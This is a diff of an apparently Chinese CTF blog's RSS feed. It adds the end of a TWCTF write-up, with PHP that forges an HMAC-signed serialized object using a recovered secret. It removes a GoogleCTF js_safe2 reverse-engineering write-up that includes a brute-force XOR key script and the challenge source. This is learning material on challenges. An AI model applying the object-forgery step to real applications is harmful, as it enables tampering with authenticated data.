+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;$secret = &amp;quot;7daeeed052fd2908fb30f462ad1c7936&amp;quot;;
+$note = new Note(true);
+$note-&amp;gt;addnote(&amp;quot;exploit&amp;quot;,&amp;quot;works&amp;quot;);
+$obj = base64_encode(serialize($note));
+print_r($obj.&amp;quot;\n&amp;quot;);
+print_r(hmac($obj, $secret));
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;获得 flag：&lt;code&gt;TWCTF{h0pefully_I_haven&#39;t_made_a_m1stake_again}&lt;/code&gt;&lt;/p&gt;
+
+&lt;h2 id=&#34;总结&#34;&gt;总结&lt;/h2&gt;
+
+&lt;p&gt;很多情况下漏洞不等价于 RCE，而在于我们是否能从不同的维度对一个功能进行探索，以上。&lt;/p&gt;
+
+&lt;h2 id=&#34;参考链接&#34;&gt;参考链接&lt;/h2&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;&lt;a href=&#34;https://n0b0dycn.me/2019/08/playing-with-windows-defender/&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;Playing with Windows Defender&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;&lt;a href=&#34;https://github.com/icchy/wctf2019-gtf/blob/master/wctf2019-gtf-slides.pdf&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;WCTF2019: Gyotaku The Flag&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+    </item>
     
     <item>
       <title>About Me</title>
@@ -3711,280 +4329,6 @@ EOF;
 &lt;/code&gt;&lt;/pre&gt;
 
 &lt;p&gt;当然这里还可以继续 32C3 的思路，使用控制文件名的方式来构造 webshell，但更为复杂，在此掠过不表。&lt;/p&gt;
-</description>
-    </item>
-    
-    <item>
-      <title>googlectf js_safe2 writeup</title>
-      <link>https://syang-ng.github.io/2018/06/googlectf-js_safe2-writeup/</link>
-      <pubDate>Tue, 26 Jun 2018 18:28:38 +0000</pubDate>
-      
-      <guid>https://syang-ng.github.io/2018/06/googlectf-js_safe2-writeup/</guid>
-      <description>
-
-&lt;h2 id=&#34;前言&#34;&gt;前言&lt;/h2&gt;
-
-&lt;p&gt;GoogleCTF 2018 上的 Web 签到题，本质上是一道 JS 逆向，使用了 JS 里一些比较 trick 的技巧&lt;/p&gt;
-
-&lt;!-- more --&gt;
-
-&lt;h2 id=&#34;分析&#34;&gt;分析&lt;/h2&gt;
-
-&lt;p&gt;可以看到页面的输入框变化会触发 &lt;code&gt;open_safe()&lt;/code&gt; 函数&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-HTML&#34;&gt;&amp;lt;input id=&amp;quot;keyhole&amp;quot; autofocus onchange=&amp;quot;open_safe()&amp;quot; placeholder=&amp;quot;🔑&amp;quot;&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;&lt;code&gt;open_safe()&lt;/code&gt; 逻辑如下：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-JavaScript&#34;&gt;function open_safe() {
-  keyhole.disabled = true;
-  password = /^CTF{([0-9a-zA-Z_@!?-]+)}$/.exec(keyhole.value);
-  if (!password || !x(password[1])) return document.body.className = &#39;denied&#39;;
-  document.body.className = &#39;granted&#39;;
-  password = Array.from(password[1]).map(c =&amp;gt; c.charCodeAt());
-  encrypted = JSON.parse(localStorage.content || &#39;&#39;);
-  content.value = encrypted.map((c,i) =&amp;gt; c ^ password[i % password.length]).map(String.fromCharCode).join(&#39;&#39;)
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;可以看到这里会先做一个正则匹配，我们输入的内容格式必须是 &lt;code&gt;CTF{xxxxxx}&lt;/code&gt;，其中 xxxxxx 的范围为 &lt;code&gt;0-9a-zA-Z_@!?-&lt;/code&gt;，囊括了大部分的可见字符&lt;/p&gt;
-
-&lt;p&gt;然后会将 &lt;code&gt;xxxxxx&lt;/code&gt; 作为参数传入 &lt;code&gt;x()&lt;/code&gt; 函数，所以我们这里需要 &lt;code&gt;x()&lt;/code&gt; 函数返回一个 true 值（或者非空即可）&lt;/p&gt;
-
-&lt;p&gt;这里有三个要点需要注意：&lt;/p&gt;
-
-&lt;ol&gt;
-&lt;li&gt;&lt;p&gt;x 和 х 的区别，前者是 ASCII 字符，后者是西里尔字母，而 &lt;code&gt;x = h(str(x));&lt;/code&gt; 实际上的参数是函数自身字符串内容，并不是我们传入的参数&lt;/p&gt;&lt;/li&gt;
-
-&lt;li&gt;&lt;p&gt;&lt;code&gt;for (a = 0; a != 1000; a++) debugger;&lt;/code&gt; 运行后 a = 1000，所以当 h 函数被调用时，内部的 a 初始值为 1000&lt;/p&gt;&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-JavaScript&#34;&gt;function h(s) {
-    for (i = 0; i != s.length; i++) {
-        a = ((typeof a == &#39;undefined&#39; ? 1 : a) + ord(str(s[i]))) % 65521;
-        b = ((typeof b == &#39;undefined&#39; ? 0 : b) + a) % 65521
-    }
-    return chr(b &amp;gt;&amp;gt; 8) + chr(b &amp;amp; 0xFF) + chr(a &amp;gt;&amp;gt; 8) + chr(a &amp;amp; 0xFF)
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;ol&gt;
-&lt;li&gt;&lt;code&gt;source = /Ӈ#7ùª9¨M¤À.áÔ¥6¦¨¹.ÿÓÂ.Ö£JºÓ¹WþÊmãÖÚG¤¢dÈ9&amp;amp;òªћ#³­1᧨/;&lt;/code&gt; 是正则模板，其没有 &lt;code&gt;.length&lt;/code&gt; 属性，所以循环应该会无限进行，但由于使用了 &lt;code&gt;with&lt;/code&gt;，则实际访问的则是 &lt;code&gt;source.source&lt;/code&gt; ，对应的是正则模板的字符串，具有 &lt;code&gt;.length&lt;/code&gt; 属性&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;h2 id=&#34;writeup&#34;&gt;Writeup&lt;/h2&gt;
-
-&lt;p&gt;优化后的代码如下：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-JavaScript&#34;&gt;function x(х) {
-    ord = Function.prototype.call.bind(&#39;&#39;.charCodeAt);
-    chr = String.fromCharCode;
-    str = String;
-
-    function h(s) {
-        for (i = 0; i != s.length; i++) {
-            a = ((typeof a == &#39;undefined&#39; ? 1 : a) + ord(str(s[i]))) % 65521;
-            b = ((typeof b == &#39;undefined&#39; ? 0 : b) + a) % 65521
-        }
-        return chr(b &amp;gt;&amp;gt; 8) + chr(b &amp;amp; 0xFF) + chr(a &amp;gt;&amp;gt; 8) + chr(a &amp;amp; 0xFF)
-    }
-
-    function c(a, b, c) {
-        for (i = 0; i != a.length; i++) c = (c || &#39;&#39;) + chr(ord(str(a[i])) ^ ord(str(b[i % b.length])));
-        return c
-    }
-
-    var a = 1000;
-
-    x = h(str(`function x(х){ord=Function.prototype.call.bind(&#39;&#39;.charCodeAt);chr=String.fromCharCode;str=String;function h(s){for(i=0;i!=s.length;i++){a=((typeof a==&#39;undefined&#39;?1:a)+ord(str(s[i])))%65521;b=((typeof b==&#39;undefined&#39;?0:b)+a)%65521}return chr(b&amp;gt;&amp;gt;8)+chr(b&amp;amp;0xFF)+chr(a&amp;gt;&amp;gt;8)+chr(a&amp;amp;0xFF)}function c(a,b,c){for(i=0;i!=a.length;i++)c=(c||&#39;&#39;)+chr(ord(str(a[i]))^ord(str(b[i%b.length])));return c}for(a=0;a!=1000;a++)debugger;x=h(str(x));source=/Ӈ#7ùª9¨M¤À.áÔ¥6¦¨¹.ÿÓÂ.Ö£JºÓ¹WþÊmãÖÚG¤¢dÈ9&amp;amp;òªћ#³­1᧨/;source.toString=function(){return c(source,x)};try{console.log(&#39;debug&#39;,source);with(source)return eval(&#39;eval(c(source,x))&#39;)}catch(e){}}`));
-
-    source = `Ӈ#7ùª9¨M¤À.áÔ¥6¦¨¹.ÿÓÂ.Ö£JºÓ¹WþÊmãÖÚG¤¢dÈ9&amp;amp;òªћ#³­1᧨`;
-
-    try {
-        console.log(c(source,x));
-        with(source) return eval(&#39;eval(c(source,x))&#39;)
-    } catch (e) {
-    }
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;运行后可以得到如下表达式：&lt;code&gt;х==c(&#39;¢×&amp;amp;Ê´cÊ¯¬$¶³´}ÍÈ´T©Ð8Í³Í|Ô÷aÈÐÝ&amp;amp;¨þJ&#39;,h(х))//᧢&lt;/code&gt;，写 python 脚本爆破即可&lt;/p&gt;
-
-&lt;p&gt;由于我们传入的参数对应的字符范围已知，并且加密密钥长度为 4，我们只需要根据加密函数爆破相应加密密钥：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-JavaScript&#34;&gt;function c(a, b, c) {
-    for (i = 0; i != a.length; i++) c = (c || &#39;&#39;) + chr(ord(str(a[i])) ^ ord(str(b[i % b.length])));
-    return c
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;p = &#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_@!?-&#39;
-
-sec = &#39;&#39;&#39;¢×&amp;amp;Ê´cÊ¯¬$¶³´}ÍÈ´T©Ð8Í³Í|Ô÷aÈÐÝ&amp;amp;¨þJ&#39;&#39;&#39;
-
-for i in range(4):
-    for c in p:
-        j = i 
-        k0 = ord(sec[j])^ord(c)
-        flag = True
-        while j &amp;lt; len(sec)-4:
-            j += 4
-            if chr(k0^ord(sec[j])) not in p:
-                flag = False
-                break
-        if flag:
-            print(&#39;%d: %d&#39; % (i, k0))
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;根据结果可以得到 &lt;code&gt;[253, 149, 21, 249]&lt;/code&gt; \ &lt;code&gt;[253, 153, 21, 249]&lt;/code&gt; 两种可能的 key 值，直接带入测试即可&lt;/p&gt;
-
-&lt;p&gt;直接带入可以解出真正的原文 &lt;code&gt;_N3x7-v3R51ON-h45-AnTI-4NTi-ant1-D3bUg_&lt;/code&gt;&lt;/p&gt;
-
-&lt;h2 id=&#34;overview&#34;&gt;Overview&lt;/h2&gt;
-
-&lt;p&gt;这题本质上是一道 reverse 题，使用了一种非常简单的加密，唯一的难度是有意无意使用了一些 trick 的技巧使得我们第一时间没有发现（比如我😭）&lt;/p&gt;
-
-&lt;h2 id=&#34;source-code&#34;&gt;Source Code&lt;/h2&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-HTML&#34;&gt;&amp;lt;!DOCTYPE html&amp;gt;
-&amp;lt;html&amp;gt;
-&amp;lt;head&amp;gt;
-&amp;lt;meta charset=&amp;quot;utf-8&amp;quot;&amp;gt;
-&amp;lt;title&amp;gt;JS safe v2.0 - the leading localStorage based safe solution with military grade JS anti-debug technology&amp;lt;/title&amp;gt;
-&amp;lt;!--
-Advertisement:
-Looking for a hand-crafted, browser based virtual safe to store your most
-interesting secrets? Look no further, you have found it. You can order your own
-by sending a mail to js_safe@example.com. When ordering, please specify the
-password you&#39;d like to use to open and close the safe. We&#39;ll hand craft a
-unique safe just for you, that only works with your password of choice.
---&amp;gt;
-&amp;lt;style&amp;gt;
-body {
-  text-align: center;
-}
-input {
-  font-size: 200%;
-  margin-top: 5em;
-  text-align: center;
-  width: 26em;
-}
-#result {
-  margin-top: 8em;
-  font-size: 300%;
-  font-family: monospace;
-  font-weight: bold;
-}
-body.granted&amp;gt;#result::before {
-  content: &amp;quot;Access Granted&amp;quot;;
-  color: green;
-}
-body.denied&amp;gt;#result::before {
-  content: &amp;quot;Access Denied&amp;quot;;
-  color: red;
-}
-#content {
-  display: none;
-}
-body.granted #content {
-  display: initial;
-}
-.wrap {
-  display: inline-block;
-  margin-top: 50px;
-  perspective: 800px;
-  perspective-origin: 50% 100px;
-}
-.cube {
-  position: relative;
-  width: 200px;
-  transform-style: preserve-3d;
-}
-.back {
-  transform: translateZ(-100px) rotateY(180deg);
-}
-.right {
-  transform: rotateY(-270deg) translateX(100px);
-  transform-origin: top right;
-}
-.left {
-  transform: rotateY(270deg) translateX(-100px);
-  transform-origin: center left;
-}
-.top {
-  transform: rotateX(-90deg) translateY(-100px);
-  transform-origin: top center;
-}
-.bottom {
-  transform: rotateX(90deg) translateY(100px);
-  transform-origin: bottom center;
-}
-.front {
-  transform: translateZ(100px);
-}
-@keyframes spin {
-  from { transform: rotateY(0); }
-  to { transform: rotateY(360deg); }
-}
-.cube {
-  animation: spin 20s infinite linear;
-}
-.cube div {
-  position: absolute;
-  width: 200px;
-  height: 200px;
-  background: rgba(0, 0, 0, 0.51);
-  box-shadow: inset 0 0 60px white;
-  font-size: 20px;
-  text-align: center;
-  line-height: 200px;
-  color: rgba(0,0,0,0.5);
-  font-family: sans-serif;
-  text-transform: uppercase;
-}
-&amp;lt;/style&amp;gt;
-&amp;lt;script&amp;gt;
-function x(х){ord=Function.prototype.call.bind(&#39;&#39;.charCodeAt);chr=String.fromCharCode;str=String;function h(s){for(i=0;i!=s.length;i++){a=((typeof a==&#39;undefined&#39;?1:a)+ord(str(s[i])))%65521;b=((typeof b==&#39;undefined&#39;?0:b)+a)%65521}return chr(b&amp;gt;&amp;gt;8)+chr(b&amp;amp;0xFF)+chr(a&amp;gt;&amp;gt;8)+chr(a&amp;amp;0xFF)}function c(a,b,c){for(i=0;i!=a.length;i++)c=(c||&#39;&#39;)+chr(ord(str(a[i]))^ord(str(b[i%b.length])));return c}for(a=0;a!=1000;a++)debugger;x=h(str(x));source=/Ӈ#7ùª9¨M¤À.áÔ¥6¦¨¹.ÿÓÂ.Ö£JºÓ¹WþÊmãÖÚG¤¢dÈ9&amp;amp;òªћ#³­1᧨/;source.toString=function(){return c(source,x)};try{console.log(&#39;debug&#39;,source);with(source)return eval(&#39;eval(c(source,x))&#39;)}catch(e){}}
-&amp;lt;/script&amp;gt;
-&amp;lt;script&amp;gt;
-function open_safe() {
-  keyhole.disabled = true;
-  password = /^CTF{([0-9a-zA-Z_@!?-]+)}$/.exec(keyhole.value);
-  if (!password || !x(password[1])) return document.body.className = &#39;denied&#39;;
-  document.body.className = &#39;granted&#39;;
-  password = Array.from(password[1]).map(c =&amp;gt; c.charCodeAt());
-  encrypted = JSON.parse(localStorage.content || &#39;&#39;);
-  content.value = encrypted.map((c,i) =&amp;gt; c ^ password[i % password.length]).map(String.fromCharCode).join(&#39;&#39;)
-}
-function save() {
-  plaintext = Array.from(content.value).map(c =&amp;gt; c.charCodeAt());
-  localStorage.content = JSON.stringify(plaintext.map((c,i) =&amp;gt; c ^ password[i % password.length]));
-}
-&amp;lt;/script&amp;gt;
-&amp;lt;/head&amp;gt;
-&amp;lt;body&amp;gt;
-&amp;lt;div&amp;gt;
-  &amp;lt;input id=&amp;quot;keyhole&amp;quot; autofocus onchange=&amp;quot;open_safe()&amp;quot; placeholder=&amp;quot;🔑&amp;quot;&amp;gt;
-&amp;lt;/div&amp;gt;
-&amp;lt;div class=&amp;quot;wrap&amp;quot;&amp;gt;
-  &amp;lt;div class=&amp;quot;cube&amp;quot;&amp;gt;
-    &amp;lt;div class=&amp;quot;front&amp;quot;&amp;gt;&amp;lt;/div&amp;gt;
-    &amp;lt;div class=&amp;quot;back&amp;quot;&amp;gt;&amp;lt;/div&amp;gt;
-    &amp;lt;div class=&amp;quot;top&amp;quot;&amp;gt;&amp;lt;/div&amp;gt;
-    &amp;lt;div class=&amp;quot;bottom&amp;quot;&amp;gt;&amp;lt;/div&amp;gt;
-    &amp;lt;div class=&amp;quot;left&amp;quot;&amp;gt;&amp;lt;/div&amp;gt;
-    &amp;lt;div class=&amp;quot;right&amp;quot;&amp;gt;&amp;lt;/div&amp;gt;
-  &amp;lt;/div&amp;gt;
-&amp;lt;/div&amp;gt;
-&amp;lt;div id=&amp;quot;result&amp;quot;&amp;gt;
-&amp;lt;/div&amp;gt;
-&amp;lt;div&amp;gt;
-  &amp;lt;input id=&amp;quot;content&amp;quot; onchange=&amp;quot;save()&amp;quot;&amp;gt;
-&amp;lt;/div&amp;gt;
-&amp;lt;/body&amp;gt;
-&amp;lt;/html&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
 </description>
     </item>
     
